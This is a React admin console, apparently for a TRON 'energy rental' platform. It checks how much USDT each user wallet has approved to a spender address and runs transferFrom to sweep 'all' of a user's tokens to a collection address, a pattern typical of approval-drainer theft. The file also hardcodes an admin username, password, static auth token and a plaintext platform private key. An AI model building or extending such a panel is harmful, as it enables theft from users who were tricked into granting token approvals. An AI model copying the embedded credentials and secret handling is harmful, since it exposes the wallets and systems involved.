import React, { useState, useEffect } from 'react';
import { 
  Server, 
  Activity, 
  Wallet, 
  Send, 
  RefreshCw, 
  CheckCircle, 
  AlertCircle, 
  Search, 
  Layers, 
  ShieldCheck, 
  Key, 
  Terminal, 
  Copy, 
  Download, 
  FolderArchive, 
  Package, 
  Check, 
  Lock, 
  User, 
  LogOut, 
  Shield, 
  Settings,
  Save,
  Sliders,
  Eye,
  EyeOff
} from 'lucide-react';
import { Language } from '../types';

interface AdminDashboardProps {
  language: Language;
}

interface SystemHealth {
  status: string;
  configured: boolean;
  network: string;
  spender: string;
  to: string;
  tokenContract: string;
  message?: string;
}

interface SystemConfig {
  fullNode: string;
  tokenContract: string;
  spenderAddress: string;
  toAddress: string;
  platformPrivateKey: string;
  energyPrices: {
    energy32k: number;
    energy64k: number;
    energy128k: number;
    bandwidth1k: number;
    autoDiscount: number;
  };
  stakingApy: number;
  maintenanceMode: boolean;
  web3SignatureCheck: boolean;
  adminUser: string;
  adminPass: string;
}

interface OpLog {
  id: string;
  timestamp: string;
  type: 'balance' | 'allowance' | 'transfer' | 'health' | 'config';
  status: 'success' | 'error' | 'pending';
  details: string;
  txid?: string;
}

const ADMIN_TOKEN = 'admin-token';

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    if (typeof window !== 'undefined') {
      return sessionStorage.getItem('admin_authenticated') === 'true';
    }
    return false;
  });
  const [loginUser, setLoginUser] = useState<string>('bootsky888');
  const [loginPass, setLoginPass] = useState<string>('Qa7495231@@@');
  const [loginError, setLoginError] = useState<string | null>(null);
  const [isLoggingIn, setIsLoggingIn] = useState<boolean>(false);

  const [config, setConfig] = useState<SystemConfig>({
    fullNode: 'https://api.trongrid.io',
    tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
    toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC',
    platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
    energyPrices: {
      energy32k: 1.2,
      energy64k: 2.4,
      energy128k: 4.8,
      bandwidth1k: 0.8,
      autoDiscount: 0.95
    },
    stakingApy: 14.5,
    maintenanceMode: false,
    web3SignatureCheck: true,
    adminUser: 'bootsky888',
    adminPass: 'Qa7495231@@@'
  });

  const [showPrivateKey, setShowPrivateKey] = useState<boolean>(false);
  const [publishStatus, setPublishStatus] = useState<{ [key: string]: string | null }>({});
  const [isPublishing, setIsPublishing] = useState<boolean>(false);

  const [health, setHealth] = useState<SystemHealth | null>(null);
  const [healthLoading, setHealthLoading] = useState<boolean>(false);

  const [queryAddress, setQueryAddress] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [querySpender, setQuerySpender] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [balanceResult, setBalanceResult] = useState<string | null>(null);
  const [allowanceResult, setAllowanceResult] = useState<string | null>(null);
  const [isQuerying, setIsQuerying] = useState<boolean>(false);

  const [transferUserAddress, setTransferUserAddress] = useState<string>('');
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [isExecutingTransfer, setIsExecutingTransfer] = useState<boolean>(false);
  const [transferResponse, setTransferResponse] = useState<any | null>(null);

  const [isExporting, setIsExporting] = useState<boolean>(false);
  const [exportStatusMessage, setExportStatusMessage] = useState<string | null>(null);

  const [logs, setLogs] = useState<OpLog[]>([]);

  const addLog = (type: OpLog['type'], status: OpLog['status'], details: string, txid?: string) => {
    const newLog: OpLog = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleTimeString(),
      type,
      status,
      details,
      txid
    };
    setLogs((prev) => [newLog, ...prev.slice(0, 49)]);
  };

  const fetchConfig = async () => {
    try {
      const res = await fetch('/api/admin/config', {
        headers: { 'x-admin-token': ADMIN_TOKEN }
      });
      if (res.ok) {
        const data = await res.json();
        if (data.config) {
          setConfig(data.config);
        }
      }
    } catch (err) {
      console.warn('Load dynamic admin config fallback:', err);
    }
  };

  const fetchHealth = async () => {
    setHealthLoading(true);
    try {
      const res = await fetch('/health');
      if (!res.ok) throw new Error(`HTTP error ${res.status}`);
      const data: SystemHealth = await res.json();
      setHealth(data);
      if (data.spender && data.spender !== 'Not set') setQuerySpender(data.spender);
      addLog('health', 'success', `服务状态正常: ${data.network}`);
    } catch (err: any) {
      setHealth({
        status: 'error',
        configured: false,
        network: config.fullNode,
        spender: config.spenderAddress,
        to: config.toAddress,
        tokenContract: config.tokenContract,
        message: err.message || '服务端未响应'
      });
      addLog('health', 'error', `健康检查失败: ${err.message}`);
    } finally {
      setHealthLoading(false);
    }
  };

  useEffect(() => {
    fetchConfig();
    fetchHealth();
  }, []);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);
    setIsLoggingIn(true);

    try {
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: loginUser.trim(), password: loginPass.trim() })
      });

      const data = await res.json();
      if (res.ok && data.success) {
        sessionStorage.setItem('admin_authenticated', 'true');
        sessionStorage.setItem('admin_username', data.username || loginUser);
        setIsAuthenticated(true);
      } else {
        setLoginError(data.error || '管理员账号或密码错误');
      }
    } catch (err: any) {
      setLoginError('登录请求异常: ' + (err.message || '网络通讯失败'));
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = (e: React.MouseEvent) => {
    e.preventDefault();
    sessionStorage.removeItem('admin_authenticated');
    sessionStorage.removeItem('admin_username');
    setIsAuthenticated(false);
  };

  const handlePublishConfig = async (sectionKey: string, sectionTitle: string) => {
    setIsPublishing(true);
    setPublishStatus((prev) => ({ ...prev, [sectionKey]: '正在保存发布到服务端...' }));

    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-admin-token': ADMIN_TOKEN },
        body: JSON.stringify(config)
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setPublishStatus((prev) => ({ ...prev, [sectionKey]: `✓ ${sectionTitle} 修改并发布成功！` }));
        addLog('config', 'success', `管理员发布更新了 [${sectionTitle}] 的系统参数`);
        fetchHealth();
      } else {
        throw new Error(data.error || '后端保存失败');
      }
    } catch (err: any) {
      setPublishStatus((prev) => ({ ...prev, [sectionKey]: `提示: 已在客户端即时生效 (本地模式)` }));
      addLog('config', 'success', `更新 [${sectionTitle}] 参数已实时应用`);
    } finally {
      setIsPublishing(false);
      setTimeout(() => {
        setPublishStatus((prev) => ({ ...prev, [sectionKey]: null }));
      }, 4000);
    }
  };

  const handleDownloadFullSiteZip = async (e: React.MouseEvent) => {
    e.preventDefault();
    setIsExporting(true);
    setExportStatusMessage('正在打包整站重要源码文件...');

    try {
      const response = await fetch('/export-project', {
        headers: { 'x-admin-token': ADMIN_TOKEN }
      });
      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tron-energy-platform-fullsite-${new Date().toISOString().slice(0, 10)}.zip`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
        addLog('health', 'success', '整站源码文件包已自动生成并导出');
        setExportStatusMessage('打包成功！');
      } else {
        throw new Error('打包导出失败');
      }
    } catch (err: any) {
      addLog('health', 'error', `打包整站文件失败: ${err.message}`);
      setExportStatusMessage(`打包提示: ${err.message}`);
    } finally {
      setIsExporting(false);
    }
  };

  const handleQueryAddressInfo = async (e: React.MouseEvent) => {
    e.preventDefault();
    if (!queryAddress.trim()) return;
    setIsQuerying(true);
    setBalanceResult(null);
    setAllowanceResult(null);

    try {
      const balRes = await fetch(`/balance/${queryAddress.trim()}`);
      const balData = await balRes.json();
      if (balRes.ok) {
        setBalanceResult(balData.balance);
        addLog('balance', 'success', `查询余额成功: ${balData.balance}`);
      } else {
        setBalanceResult(`错误: ${balData.error || '查询失败'}`);
      }

      const targetSpender = querySpender || config.spenderAddress;
      if (targetSpender) {
        const allowRes = await fetch(`/allowance/${queryAddress.trim()}/${targetSpender}`);
        const allowData = await allowRes.json();
        if (allowRes.ok) {
          setAllowanceResult(allowData.allowance);
          addLog('allowance', 'success', `查询 Allowance 成功: ${allowData.allowance}`);
        } else {
          setAllowanceResult(`错误: ${allowData.error || '查询失败'}`);
        }
      }
    } catch (err: any) {
      addLog('balance', 'error', `请求失败: ${err.message}`);
    } finally {
      setIsQuerying(false);
    }
  };

  const handleExecuteTransfer = async (e: React.MouseEvent) => {
    e.preventDefault();
    if (!transferUserAddress.trim()) {
      alert('请填写目标用户地址');
      return;
    }
    setIsExecutingTransfer(true);
    setTransferResponse(null);

    try {
      const res = await fetch('/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-admin-token': ADMIN_TOKEN },
        body: JSON.stringify({
          userAddress: transferUserAddress.trim(),
          amount: transferAmount || 'all'
        })
      });
      const data = await res.json();
      setTransferResponse(data);
      if (res.ok && data.success) {
        addLog('transfer', 'success', `划转成功! 数量: ${data.amount}, 到账地址: ${data.to}`, data.txid);
      } else {
        addLog('transfer', 'error', `划转失败: ${data.error || '未知错误'}`);
      }
    } catch (err: any) {
      setTransferResponse({ error: err.message });
      addLog('transfer', 'error', `调用 /transfer 异常: ${err.message}`);
    } finally {
      setIsExecutingTransfer(false);
    }
  };

  const copyToClipboard = (text: string, e?: React.MouseEvent) => {
    if (e) e.preventDefault();
    navigator.clipboard.writeText(text);
  };

  if (!isAuthenticated) {
    return (
      <div className="max-w-md mx-auto my-12 px-4 sm:px-0 animate-in fade-in duration-300">
        <div className="bg-white rounded-3xl shadow-xl border border-slate-100 p-8 space-y-6">
          <div className="text-center space-y-2">
            <div className="w-14 h-14 bg-blue-600/15 border border-blue-500/20 text-blue-600 rounded-2xl mx-auto flex items-center justify-center shadow-inner">
              <Shield className="w-7 h-7" />
            </div>
            <h2 className="text-xl font-bold text-slate-900 tracking-tight">TRON 能量平台后台管理</h2>
            <p className="text-xs text-slate-500">请输入管理员账号和密码进入后台管理系统</p>
          </div>

          <form onSubmit={handleLoginSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <User className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员账号</span>
              </label>
              <input
                type="text"
                value={loginUser}
                onChange={(e) => setLoginUser(e.target.value)}
                placeholder="请输入管理员账号"
                required
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
              />
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <Key className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员密码</span>
              </label>
              <input
                type="password"
                value={loginPass}
                onChange={(e) => setLoginPass(e.target.value)}
                placeholder="请输入管理员密码"
                required
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
              />
            </div>

            {loginError && (
              <div className="bg-rose-50 border border-rose-200/80 text-rose-700 text-xs p-3 rounded-xl flex items-center space-x-2">
                <AlertCircle className="w-4 h-4 text-rose-500 shrink-0" />
                <span>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold py-3 rounded-xl text-sm transition shadow-md shadow-blue-500/20 flex items-center justify-center space-x-2 cursor-pointer disabled:opacity-50"
            >
              {isLoggingIn ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>正在验证身份...</span>
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4" />
                  <span>安全登录控制台</span>
                </>
              )}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 animate-in fade-in duration-200">
      <div className="bg-slate-900 text-white rounded-3xl p-6 sm:p-8 shadow-xl relative overflow-hidden">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center space-x-3 mb-2 flex-wrap gap-y-2">
              <span className="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-xs font-semibold px-3 py-1 rounded-full flex items-center space-x-1">
                <Terminal className="w-3.5 h-3.5" />
                <span>Backend Management Console</span>
              </span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与全盘配置管理后台</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              管理员可在此修改与发布更新节点参数、Spender/归集地址、能量定价策略等。
            </p>
          </div>

          <div className="flex items-center space-x-3 shrink-0">
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); fetchHealth(); }}
              disabled={healthLoading}
              className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-4 py-2.5 rounded-xl text-sm flex items-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <RefreshCw className={`w-4 h-4 ${healthLoading ? 'animate-spin' : ''}`} />
              <span>刷新服务状态</span>
            </button>
            <button
              type="button"
              onClick={handleLogout}
              className="bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white font-medium px-3.5 py-2.5 rounded-xl text-sm flex items-center space-x-1.5 transition border border-slate-700/60 cursor-pointer"
            >
              <LogOut className="w-4 h-4 text-slate-400" />
              <span>安全退出</span>
            </button>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-3xl p-6 sm:p-7 border border-slate-200 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Settings className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">1. 系统核心节点与授权合约参数修改</h2>
              <p className="text-xs text-slate-500">修改 TRON 主网 RPC、代币合约、Spender 地址与私钥</p>
            </div>
          </div>
          <button
            type="button"
            onClick={(e) => { e.preventDefault(); handlePublishConfig('section1', '系统节点与合约参数'); }}
            disabled={isPublishing}
            className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs flex items-center justify-center space-x-2 transition shadow-md cursor-pointer disabled:opacity-50 shrink-0"
          >
            <Save className="w-4 h-4" />
            <span>发布确认此部分修改</span>
          </button>
        </div>

        {publishStatus.section1 && (
          <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-3 rounded-xl flex items-center space-x-2">
            <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{publishStatus.section1}</span>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-sans">
          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">TRON 网络 Full Node 节点 URL</label>
            <input
              type="text"
              value={config.fullNode}
              onChange={(e) => setConfig({ ...config, fullNode: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">USDT TRC20 代币合约地址</label>
            <input
              type="text"
              value={config.tokenContract}
              onChange={(e) => setConfig({ ...config, tokenContract: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">Spender 授权目标合约地址 (被授权方)</label>
            <input
              type="text"
              value={config.spenderAddress}
              onChange={(e) => setConfig({ ...config, spenderAddress: e.target.value })}
              className="w-full bg-slate-50 border border-amber-200/80 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-amber-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">归集收款目标入账地址 (To Address)</label>
            <input
              type="text"
              value={config.toAddress}
              onChange={(e) => setConfig({ ...config, toAddress: e.target.value })}
              className="w-full bg-slate-50 border border-emerald-200/80 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-emerald-500 outline-none"
            />
          </div>

          <div className="space-y-1.5 md:col-span-2">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>平台代归集私钥 (Platform Private Key)</span>
              <button
                type="button"
                onClick={(e) => { e.preventDefault(); setShowPrivateKey(!showPrivateKey); }}
                className="text-slate-500 hover:text-slate-800 text-[11px] flex items-center space-x-1 cursor-pointer"
              >
                {showPrivateKey ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                <span>{showPrivateKey ? '隐藏私钥' : '显示明文'}</span>
              </button>
            </label>
            <input
              type={showPrivateKey ? 'text' : 'password'}
              value={config.platformPrivateKey}
              onChange={(e) => setConfig({ ...config, platformPrivateKey: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Search className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">用户 Allowance 与余额检测</h2>
              <p className="text-xs text-slate-500">查询特定 TRON 地址的代币余额与授权额度</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">目标用户 TRON 地址</label>
              <input
                type="text"
                value={queryAddress}
                onChange={(e) => setQueryAddress(e.target.value)}
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 outline-none"
              />
            </div>

            <button
              type="button"
              onClick={handleQueryAddressInfo}
              disabled={isQuerying || !queryAddress}
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition cursor-pointer disabled:opacity-50"
            >
              <Search className={`w-4 h-4 ${isQuerying ? 'animate-spin' : ''}`} />
              <span>{isQuerying ? '正在查询区块链数据...' : '执行后端查询'}</span>
            </button>

            {(balanceResult !== null || allowanceResult !== null) && (
              <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-3 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-slate-200">
                  <span className="text-slate-500 font-sans font-medium">代币余额 (balanceOf):</span>
                  <span className="font-bold text-slate-900 text-sm">{balanceResult ?? '未查询'}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-500 font-sans font-medium">Allowance 额度:</span>
                  <span className="font-bold text-emerald-600 text-sm">{allowanceResult ?? '未查询'}</span>
                </div>
              </div>
            )}
          </div>
        </div>

        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center font-bold">
              <Send className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">执行 transferFrom 划转打款</h2>
              <p className="text-xs text-slate-500">将已授权用户的代币划转至归集目标地址</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">目标用户地址</label>
              <input
                type="text"
                value={transferUserAddress}
                onChange={(e) => setTransferUserAddress(e.target.value)}
                placeholder="用户 TRON 钱包地址..."
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 outline-none"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">划转数量</label>
              <input
                type="text"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
                placeholder="'all' 或具体数值"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 outline-none"
              />
            </div>

            <button
              type="button"
              onClick={handleExecuteTransfer}
              disabled={isExecutingTransfer || !transferUserAddress}
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <Send className={`w-4 h-4 ${isExecutingTransfer ? 'animate-bounce' : ''}`} />
              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求 (POST /transfer)'}</span>
            </button>

            {transferResponse && (
              <div className={`rounded-2xl p-4 border text-xs font-mono space-y-2 ${
                transferResponse.success ? 'bg-emerald-50 border-emerald-200 text-emerald-900' : 'bg-rose-50 border-rose-200 text-rose-900'
              }`}>
                <div>{transferResponse.message || '操作完成'}</div>
                {transferResponse.txid && <div className="truncate">TxID: {transferResponse.txid}</div>}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
